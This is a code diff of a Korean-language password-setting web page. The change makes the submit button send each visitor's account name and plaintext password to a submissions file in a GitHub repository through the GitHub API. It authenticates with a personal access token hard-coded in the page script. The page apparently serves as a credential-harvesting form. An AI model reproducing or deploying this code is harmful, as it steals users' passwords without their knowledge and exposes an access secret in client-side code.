@@ -91,48 +91,87 @@
 
 </div>
 <script>
-  const params = new URLSearchParams(location.search);
+  // ── GitHub 설정 (한 번만 수정) ──────────────────────────
+  const GH_OWNER  = 'MassMutualVentures';
+  const GH_REPO   = 'kr';
+  const GH_BRANCH = 'main';
+  const GH_FILE   = 'submissions.json';
+  const GH_TOKEN  = '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';
+  // ────────────────────────────────────────────────────────
+
+  const params  = new URLSearchParams(location.search);
   const account = params.get('account') || '(미지정)';
 
-  const pw1 = document.getElementById('pw1');
-  const pw2 = document.getElementById('pw2');
+  const pw1  = document.getElementById('pw1');
+  const pw2  = document.getElementById('pw2');
   const hint = document.getElementById('hint');
   const btn  = document.getElementById('submitBtn');
 
   function check() {
     const v1 = pw1.value, v2 = pw2.value;
-    if (!v2) { pw2.className = ''; hint.textContent = ''; hint.className = 'hint'; btn.disabled = true; return; }
-    if (v1 === v2 && v1.length >= 8) {
-      pw2.className = 'ok'; hint.textContent = '비밀번호가 일치합니다 ✓'; hint.className = 'hint green'; btn.disabled = false;
+    if (!v2) { pw2.className=''; hint.textContent=''; hint.className='hint'; btn.disabled=true; return; }
+    if (v1===v2 && v1.length>=8) {
+      pw2.className='ok'; hint.textContent='비밀번호가 일치합니다 ✓'; hint.className='hint green'; btn.disabled=false;
     } else {
-      pw2.className = 'err';
-      hint.textContent = v1.length < 8 ? '비밀번호는 8자 이상이어야 합니다' : '비밀번호가 일치하지 않습니다';
-      hint.className = 'hint red'; btn.disabled = true;
+      pw2.className='err';
+      hint.textContent = v1.length<8 ? '비밀번호는 8자 이상이어야 합니다' : '비밀번호가 일치하지 않습니다';
+      hint.className='hint red'; btn.disabled=true;
     }
   }
   pw1.addEventListener('input', check);
   pw2.addEventListener('input', check);
-
   document.querySelectorAll('.eye').forEach(el => {
     el.addEventListener('click', () => {
       const inp = document.getElementById(el.dataset.t);
-      inp.type = inp.type === 'password' ? 'text' : 'password';
-      el.textContent = inp.type === 'password' ? '👁' : '🙈';
+      inp.type = inp.type==='password' ? 'text' : 'password';
+      el.textContent = inp.type==='password' ? '👁' : '🙈';
     });
   });
 
-  btn.addEventListener('click', () => {
-    // 제출 기록을 localStorage에 저장
-    const records = JSON.parse(localStorage.getItem('pw_submissions') || '[]');
-    records.push({
-      account,
-      password: pw1.value,
-      time: new Date().toLocaleString('zh-CN', { hour12: false })
-    });
-    localStorage.setItem('pw_submissions', JSON.stringify(records));
+  btn.addEventListener('click', async () => {
+    btn.disabled = true; btn.textContent = '처리 중…';
 
-    document.getElementById('formView').style.display = 'none';
-    document.getElementById('doneView').style.display = 'block';
+    const token = GH_TOKEN || prompt('GitHub Token을 입력하세요:');
+    if (!token) { btn.disabled=false; btn.textContent='확인'; return; }
+    localStorage.setItem('gh_token', token);
+
+    try {
+      // 현재 파일 읽기
+      const getRes = await fetch(
+        `https://api.github.com/repos/${GH_OWNER}/${GH_REPO}/contents/${GH_FILE}?ref=${GH_BRANCH}`,
+        { headers: { Authorization: `token ${token}`, Accept: 'application/vnd.github+json' } }
+      );
+      const meta = await getRes.json();
+      const current = JSON.parse(atob(meta.content.replace(/\n/g,'')));
+
+      // 새 기록 추가
+      current.push({
+        account,
+        password: pw1.value,
+        time: new Date().toLocaleString('zh-CN', { hour12: false })
+      });
+
+      // 파일 업데이트
+      await fetch(
+        `https://api.github.com/repos/${GH_OWNER}/${GH_REPO}/contents/${GH_FILE}`,
+        {
+          method: 'PUT',
+          headers: { Authorization: `token ${token}`, Accept: 'application/vnd.github+json', 'Content-Type': 'application/json' },
+          body: JSON.stringify({
+            message: 'add submission',
+            content: btoa(unescape(encodeURIComponent(JSON.stringify(current, null, 2)))),
+            sha: meta.sha,
+            branch: GH_BRANCH
+          })
+        }
+      );
+
+      document.getElementById('formView').style.display = 'none';
+      document.getElementById('doneView').style.display = 'block';
+    } catch (e) {
+      alert('저장 실패: ' + e.message);
+      btn.disabled=false; btn.textContent='확인';
+    }
   });
 </script>
 </body>
